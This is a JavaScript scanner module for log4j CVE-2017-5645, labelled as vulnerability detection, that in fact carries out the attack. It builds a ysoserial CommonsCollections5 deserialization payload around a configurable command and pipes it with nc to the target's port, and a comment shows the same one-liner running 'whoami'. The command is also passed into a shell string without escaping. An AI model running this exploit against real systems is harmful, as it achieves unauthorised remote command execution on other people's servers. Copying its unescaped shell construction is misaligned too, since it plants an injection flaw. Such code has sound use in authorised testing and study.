module.exports={
	tags:"log4j,web,CVE-2017-5645",
    des:"CVE-2017-5645,Vulnerability detection,log4j",
    dependencies:"java,ysoserial,base64,nc",
    VulApps:[],
    doIted:{},
	urls:["https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2017-5645"],
	doCheck:function (url,fnCbk)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        var szK = `${hst.hostname}:${hst.port}`;
        if(_t.doIted[szK])return;
        // java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'whoami'| nc your-ip 4712
        var szPay1 = _s.child_process.execSync(`java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 '${_s.g_szCmd}'| nc -q 3 -n ${hst.hostname} ${hst.port}`).toString("utf-8");
        _t.doIted[szK] = 1;
	}
};
